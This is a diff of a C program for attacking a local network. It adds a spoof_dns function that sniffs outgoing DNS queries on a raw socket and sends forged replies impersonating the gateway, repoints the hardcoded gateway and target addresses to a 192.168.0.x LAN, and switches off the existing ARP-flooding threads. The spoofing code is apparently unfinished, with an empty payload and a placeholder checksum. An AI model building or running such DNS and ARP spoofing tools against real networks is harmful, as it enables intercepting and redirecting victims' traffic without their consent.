@@ -8,6 +8,7 @@
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
 #include <linux/ip.h>
+#include <linux/udp.h>
 #include <net/ethernet.h>
 #include <net/if_arp.h>
 #include <netdb.h>
@@ -26,15 +27,15 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-//#define INTERFACE_NAME "enp0s31f6"
-#define INTERFACE_NAME "wlp2s0"
+#define INTERFACE_NAME "enp0s31f6"
+//#define INTERFACE_NAME "wlp2s0"
 
-//#define GATEWAY_IP "192.168.0.1"
-//#define TARGET_IP "192.168.0.4"
+#define GATEWAY_IP "192.168.0.1"
+#define TARGET_IP "192.168.0.4"
 //#define GATEWAY_IP "1.1.1.1"
 //#define TARGET_IP "8.8.8.8"
-#define GATEWAY_IP "142.232.49.6"
-#define TARGET_IP "142.232.48.123"
+//#define GATEWAY_IP "142.232.49.6"
+//#define TARGET_IP "142.232.48.123"
 
 struct thread_arg {
     int sock;
@@ -246,6 +247,171 @@ void* flood_arp(void* ta) {
     return NULL;
 }
 
+//https://stackoverflow.com/questions/32750903/ip-checksum-calculating
+void compute_ip_checksum(struct iphdr* ip) {
+    unsigned short* begin = (unsigned short*) ip;
+    unsigned short* end = begin + 5 / 2;
+    unsigned int checksum = 0, first_half, second_half;
+
+    ip->check = 0;
+    for (; begin != end; begin++) {
+        checksum += *begin;
+    }
+
+    first_half = (unsigned short) (checksum >> 16);
+    while (first_half) {
+        second_half = (unsigned short) ((checksum << 16) >> 16);
+        checksum = first_half + second_half;
+        first_half = (unsigned short) (checksum >> 16);
+    }
+
+    ip->check = ~checksum;
+}
+
+//https://gist.github.com/GreenRecycleBin/1273763
+uint16_t udp_checksum(
+        struct udphdr* p_udp_header, size_t len, uint32_t src_addr, uint32_t dest_addr) {
+    const uint16_t* buf = (const uint16_t*) p_udp_header;
+    uint16_t *ip_src = (void*) &src_addr, *ip_dst = (void*) &dest_addr;
+    uint32_t sum;
+    size_t length = len;
+
+    // Calculate the sum
+    sum = 0;
+    while (len > 1) {
+        sum += *buf++;
+        if (sum & 0x80000000)
+            sum = (sum & 0xFFFF) + (sum >> 16);
+        len -= 2;
+    }
+
+    if (len & 1) {
+        // Add the padding if the packet lenght is odd
+        sum += *((uint8_t*) buf);
+    }
+
+    // Add the pseudo-header
+    sum += *(ip_src++);
+    sum += *ip_src;
+
+    sum += *(ip_dst++);
+    sum += *ip_dst;
+
+    sum += htons(IPPROTO_UDP);
+    sum += htons(length);
+
+    // Add the carries
+    while (sum >> 16) {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+
+    // Return the one's complement of sum
+    return (uint16_t) ~sum;
+}
+
+unsigned short csum(unsigned short* buf, int nwords) {
+#if 1
+    unsigned long sum;
+    for (sum = 0; nwords > 0; nwords--) {
+        sum += *buf++;
+    }
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum += (sum >> 16);
+    return ~sum;
+#else
+    long sum;
+    unsigned short oddbyte;
+    short answer;
+
+    sum = 0;
+    while (nwords > 1) {
+        sum += *buf++;
+        nwords -= 2;
+    }
+    if (nwords == 1) {
+        oddbyte = 0;
+        *((u_char*) &oddbyte) = *(u_char*) buf;
+        sum += oddbyte;
+    }
+
+    sum = (sum >> 16) + (sum & 0xffff);
+    sum = sum + (sum >> 16);
+    answer = (short) ~sum;
+
+    return (answer);
+#endif
+}
+
+void spoof_dns(int sock) {
+    unsigned char buffer[65535];
+    struct ether_header* eh = (struct ether_header*) buffer;
+    struct iphdr* ih = (struct iphdr*) (buffer + sizeof(struct ether_header));
+    struct udphdr* uh
+            = (struct udphdr*) (buffer + sizeof(struct ether_header) + sizeof(struct iphdr));
+
+    unsigned char recv_buffer[65535];
+    struct ether_header* recv_eh = (struct ether_header*) recv_buffer;
+    struct iphdr* recv_ih = (struct iphdr*) (recv_buffer + sizeof(struct ether_header));
+    struct udphdr* recv_uh
+            = (struct udphdr*) (recv_buffer + sizeof(struct ether_header) + sizeof(struct iphdr));
+
+    //Initial constant packet settings
+    //Zero buffer for defaults
+    memset(buffer, 0, 65535);
+
+    eh->ether_type = htons(ETH_P_IP);
+    memcpy(eh->ether_shost, gateway_mac, ETHER_ADDR_LEN);
+
+    int size;
+    int data_len = 20;
+    while ((size = read(sock, recv_buffer, 65535)) > 0) {
+        if (ntohs(recv_uh->dest) != 53 || ntohs(recv_uh->source) == 53) {
+            continue;
+        }
+        printf("Read outgoing dns request\n");
+        //Destination is received source mac
+        memcpy(eh->ether_dhost, recv_eh->ether_shost, ETHER_ADDR_LEN);
+
+        //IP stuffs
+        ih->version = 4;
+        ih->ihl = 5;
+        ih->protocol = IPPROTO_UDP;
+        ih->saddr = recv_ih->daddr;
+        ih->daddr = recv_ih->saddr;
+        ih->tot_len = htons(20 + sizeof(struct udphdr) + data_len);
+        ih->id = htons(ntohs(recv_ih->id) + 1);
+        ih->ttl = recv_ih->ttl;
+        //Calculate ip checksum
+        ih->check = csum((unsigned short*) ih, ih->tot_len);
+
+        //UDP stuffs
+        uh->source = recv_uh->dest;
+        uh->dest = recv_uh->source;
+        uh->len = htons(data_len + sizeof(struct udphdr));
+
+        //Calculate udp checksum
+        //uh->check = udp_checksum(uh, data_len, ih->saddr, ih->daddr);
+        uh->check = htons(1337);
+
+        struct sockaddr_ll addr = {0};
+        addr.sll_family = AF_PACKET;
+        addr.sll_ifindex = local_interface_index;
+        addr.sll_halen = ETHER_ADDR_LEN;
+        addr.sll_protocol = htons(ETH_P_IP);
+        memcpy(addr.sll_addr, &ih->daddr, ETHER_ADDR_LEN);
+
+        sendto(sock, buffer,
+                sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)
+                        + data_len,
+                0, (struct sockaddr*) &addr, sizeof(struct sockaddr_ll));
+        printf("Spoofed dns response\n");
+    }
+    if (size == -1) {
+        perror("dns read");
+        exit(EXIT_FAILURE);
+    }
+}
+
 int main(void) {
     if (setuid(0)) {
         perror("setuid");
@@ -283,6 +449,7 @@ int main(void) {
     printf("%02x %02x %02x %02x %02x %02x\n", target_mac[0], target_mac[1], target_mac[2],
             target_mac[3], target_mac[4], target_mac[5]);
 
+#if 0
     struct thread_arg ta;
     ta.sock = pack_sock;
     ta.victim_mac = gateway_mac;
@@ -291,14 +458,15 @@ int main(void) {
     pthread_t one;
     pthread_t two;
 
-    pthread_create(&one, NULL, flood_arp, &ta);
+    //pthread_create(&one, NULL, flood_arp, &ta);
 
     struct thread_arg tb;
     tb.sock = pack_sock;
     tb.victim_mac = target_mac;
     tb.victim_ip = target_ip;
 
-    pthread_create(&two, NULL, &flood_arp, &tb);
+    //pthread_create(&two, NULL, &flood_arp, &tb);
+#endif
 
     if (setsockopt(pack_sock, SOL_SOCKET, SO_ATTACH_FILTER, &port_filter, sizeof(port_filter))
             < 0) {
@@ -306,15 +474,11 @@ int main(void) {
         goto finish;
     }
 
-    unsigned char m[65535];
-    int size;
-    while ((size = read(pack_sock, m, 65535)) > 0) {
-        printf("Read %d bytes\n", size);
-    }
+    spoof_dns(pack_sock);
 
 finish:
-    pthread_join(one, NULL);
-    pthread_join(two, NULL);
+    //pthread_join(one, NULL);
+    //pthread_join(two, NULL);
 
     close(pack_sock);
 
